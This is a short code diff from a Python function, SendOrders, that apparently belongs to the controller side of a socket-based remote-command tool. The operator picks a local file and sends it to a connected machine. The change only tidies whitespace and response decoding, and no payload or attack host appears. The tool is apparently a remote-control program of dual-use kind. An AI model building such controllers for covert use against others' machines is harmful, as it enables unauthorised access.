@@ -99,21 +99,21 @@ def SendOrders(Con):
             try:
                     
                 try:
+
                     Up = input(" - File Path -> ")
                     Up = Up.replace('"',"")
 
                     with open(Up, "rb") as F:
                         Data = F.read() # Read File Bytes
+
                 except:
                     print(" - File Error")
                     continue
 
                 Con.send(str.encode(Command)) # Send Command
                 
-                Recv = Con.recv(1024)
+                Recv = Con.recv(1024).decode("utf-8")
                 
-                Recv = Recv.decode("utf-8")
-
                 if(Recv == "file"):
                 	
                         User = input(" - File Extension -> ")
